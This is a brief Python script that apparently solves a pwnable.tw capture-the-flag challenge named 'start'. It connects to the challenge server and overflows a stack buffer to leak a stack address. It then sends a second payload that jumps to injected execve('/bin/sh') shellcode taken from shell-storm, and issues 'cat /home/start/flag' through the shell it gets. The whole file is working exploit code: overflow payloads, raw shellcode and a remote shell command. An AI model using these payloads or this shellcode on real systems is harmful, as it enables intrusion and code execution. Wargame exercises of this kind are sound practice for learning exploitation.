import socket, struct

payload = b"A"*20
payload += struct.pack("<I", 0x08048087)

shellcode = b""
shellcode += b"1\xd2" # xor edx,edx
# https://shell-storm.org/shellcode/files/shellcode-827.html
shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10000))
print(s.recv(100))

s.send(payload)
stack_leak = struct.unpack("<I",s.recv(4))[0]
print(s.recv(100))

payload = b"A"*20 + struct.pack("<I", stack_leak+20) + shellcode
s.send(payload)
s.send(b"cat /home/start/flag\n")
print(s.recv(100))
